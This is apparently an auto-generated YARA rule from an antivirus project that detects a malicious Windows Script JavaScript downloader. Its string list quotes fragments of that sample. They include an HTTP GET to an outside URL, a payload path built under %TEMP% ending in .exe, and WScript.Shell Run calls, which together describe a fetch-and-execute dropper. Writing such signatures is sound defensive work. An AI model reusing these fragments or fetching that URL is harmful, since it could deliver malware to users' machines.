rule sig_20160329_20d1046efe0accae774831884594c3cd {
  meta:
    description = "datamaliciousorder - file 20160329_20d1046efe0accae774831884594c3cd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e764d228f577ed8a8e77e1896e448ebc3a2fbcbcfe634f40cc184852fc206d74"

  strings:
    $s1  = "VG[i](\"GET\", \"http://lojaagrometal.com.br/mi3sa\", false);" fullword ascii
    $s2  = "function J() {return Jo[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XzB7QuZzlCde.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[yW](U() * 11); if (VG[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function nB(C0, Nq){T = T * 1; return C0 - Nq;};" fullword ascii
    $s5  = "var Jo = function y() {return WScript[K](\"WScript.Shell\");}(), i0 = 11;" fullword ascii
    $s6  = "function m(){return \"\" + X;};" fullword ascii
    $s7  = "function Bt(OA){Jo[\"Run\"](OA, T, T);};" fullword ascii
    $s8  = "function RM() {return ((RK == true) && (RK == kY)) ? 1 : T;};" fullword ascii
    $s9  = "function C(){return K;};" fullword ascii
    $s10 = "function jh()" fullword ascii
    $s11 = "function uT(k) {var K0 = (1, 2, 3, 4, 5, k); return K0;};" fullword ascii
    $s12 = "var SH = new this[\"Date\"]();" fullword ascii
    $s13 = " while (x){" fullword ascii
    $s14 = "function U(){return 22;};" fullword ascii
    $s15 = "return nB(Pv, J0);" fullword ascii
    $s16 = "kY = true; " fullword ascii
    $s17 = "var RK = false;" fullword ascii
    $s18 = "var s = false;" fullword ascii
    $s19 = "RK = true; " fullword ascii
    $s20 = "var kY = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}